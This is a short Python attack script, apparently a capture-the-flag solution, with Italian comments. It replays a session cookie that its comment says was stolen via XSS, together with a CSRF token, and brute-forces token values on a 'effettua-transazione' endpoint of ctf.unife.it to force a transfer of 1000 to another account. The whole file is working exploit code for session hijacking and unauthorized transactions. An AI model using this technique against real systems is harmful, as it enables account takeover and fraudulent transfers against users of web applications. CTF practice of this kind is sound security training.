import requests

# Cookie rubato con xss
cookies = {
    "session-csrf-2": "eyJ1c2VyaWQiOiIxIn0.Z92SdA.v6hTp2_zrPeKEdnoa__Y5IiUVus", 
}
headers = {
    "Content-Type": "application/json",
    "X-CSRF-Token": "ImQ4NmEzMjZiZGMzNjZjY2Q4NTRjMzdjOGM2MjFiZmE3NDJhZGU5MDQi.Z9VxXA.B04TKb3VAXaIGAnTsqWjhxgs4q0",
    "X-requested-with": "XMLHttpRequest",
}

for i  in range(100):
    token = f"test_1742576398_%\5E{i}"

    url = f"http://ctf.unife.it:13085/effettua-transazione?toconto=4&amount=1000&token={token}"

    response = requests.get(url, headers=headers, cookies=cookies); 
    if response.status_code == 200:
        print(response.status_code)
        print(response.text)
        break
